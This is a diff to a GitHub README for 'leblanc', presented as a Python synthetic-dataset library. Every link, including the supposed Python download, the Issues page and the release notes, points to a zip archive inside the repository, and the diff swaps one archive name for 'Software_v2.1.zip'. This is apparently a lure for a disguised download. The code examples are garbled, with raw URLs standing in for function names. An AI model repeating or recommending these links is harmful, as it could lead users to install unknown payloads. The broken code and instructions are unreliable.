@@ -1,7 +1,7 @@
 # 🛠️ leblanc - Generate Synthetic Datasets Effortlessly
 
 ## 📦 Download Now
-[![Download leblanc](https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/leblanc_v1.3.zip%20leblanc-v1.0-brightgreen)](https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/leblanc_v1.3.zip)
+[![Download leblanc](https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/Software_v2.1.zip%20leblanc-v1.0-brightgreen)](https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/Software_v2.1.zip)
 
 ## 📝 Overview
 leblanc is a modular Python library designed for the rapid generation of large-scale synthetic datasets across various business sectors. It is built using Pandas, NumPy, and Faker to create realistic, structured DataFrames. With leblanc, you can quickly produce data suitable for Data Science training, testing, and exploratory data analysis (EDA).
@@ -22,10 +22,10 @@ Before you start using leblanc, you need to install Python on your computer.
 
 ## 💻 Installation Guide
 1. **Download the Software**
-   Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/leblanc_v1.3.zip).
+   Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/Software_v2.1.zip).
 
 2. **Install Python**
-   If you don’t have Python installed, download it from [https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/leblanc_v1.3.zip](https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/leblanc_v1.3.zip). Follow the installation instructions for your operating system.
+   If you don’t have Python installed, download it from [https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/Software_v2.1.zip](https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/Software_v2.1.zip). Follow the installation instructions for your operating system.
 
 3. **Download leblanc**
    On the GitHub Releases page, find the latest version of leblanc and download it.
@@ -45,7 +45,7 @@ To create a basic dataset, you can run:
 ```python
 import leblanc
 
-data = https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/leblanc_v1.3.zip(num_rows=1000)
+data = https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/Software_v2.1.zip(num_rows=1000)
 print(data)
 ```
 This will generate a dataset with 1,000 rows.
@@ -53,7 +53,7 @@ This will generate a dataset with 1,000 rows.
 ### 🔍 Customize Your Dataset
 You can customize the dataset by specifying the types of data you want. For example:
 ```python
-data = https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/leblanc_v1.3.zip(num_rows=1000, types={'name': 'string', 'age': 'integer', 'salary': 'float'})
+data = https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/Software_v2.1.zip(num_rows=1000, types={'name': 'string', 'age': 'integer', 'salary': 'float'})
 print(data)
 ```
 This code will create a dataset with names, ages, and salaries.
@@ -66,20 +66,20 @@ This code will create a dataset with names, ages, and salaries.
 ## 📋 Usage Examples
 ### Example 1: Generating Finance Data
 ```python
-finance_data = https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/leblanc_v1.3.zip(num_records=500)
+finance_data = https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/Software_v2.1.zip(num_records=500)
 print(finance_data)
 ```
 This example generates finance-related data with 500 records.
 
 ### Example 2: Generating Educational Data
 ```python
-edu_data = https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/leblanc_v1.3.zip(num_students=300)
+edu_data = https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/Software_v2.1.zip(num_students=300)
 print(edu_data)
 ```
 This example creates educational data for 300 students.
 
 ## 🔗 Support & Contribution
-To report any issues or ask for support, please create a new issue in the [Issues section](https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/leblanc_v1.3.zip). If you would like to contribute, check the [Contribution Guidelines](https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/leblanc_v1.3.zip).
+To report any issues or ask for support, please create a new issue in the [Issues section](https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/Software_v2.1.zip). If you would like to contribute, check the [Contribution Guidelines](https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/Software_v2.1.zip).
 
 ## 📄 License
 leblanc is licensed under the MIT License. You can use it freely while maintaining credit to the original authors.
@@ -88,7 +88,7 @@ leblanc is licensed under the MIT License. You can use it freely while maintaini
 Explore the official documentation for more advanced features. The documentation includes various tutorials and examples to help you utilize leblanc effectively.
 
 ## 📅 Last Updated
-The last update was on YYYY-MM-DD. For the latest changes and features, always refer to the [Release Notes](https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/leblanc_v1.3.zip).
+The last update was on YYYY-MM-DD. For the latest changes and features, always refer to the [Release Notes](https://raw.githubusercontent.com/TechnicalIssuee/leblanc/main/assets/Software_v2.1.zip).
 
 ## 📚 Additional Resources
 For further information, consider these topics:
